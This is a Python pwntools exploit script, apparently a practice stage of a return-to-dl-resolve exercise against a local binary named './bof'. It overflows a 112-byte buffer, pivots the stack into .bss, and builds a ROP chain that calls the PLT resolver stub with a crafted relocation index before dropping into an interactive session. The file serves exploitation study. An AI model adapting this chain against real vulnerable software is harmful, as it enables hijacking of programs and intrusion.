#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

io = process("./bof")
elf = ELF("./bof")
rop = ROP("./bof")

offset = 112
base = elf.bss() + 0x800

rop.raw('a' * offset)
rop.read(0, base, 0x100)
rop.migrate(base)

io.sendlineafter("!\n", rop.chain())


cmd = "/bin/sh\0"
plt0 = elf.get_section_by_name('.plt').header.sh_addr
reloc_index = 8 * ((elf.plt['write'] - plt0) / 16 - 1)

rop = ROP("./bof")
rop.raw(plt0)
rop.raw(reloc_index)
rop.write(1, base + 0x80, len(cmd))
rop.raw('a' * (0x80 - len(rop.chain())))
rop.raw(cmd)
rop.raw('a' * (0x100 - len(rop.chain())))

io.sendline(rop.chain())

io.interactive()
io.close()
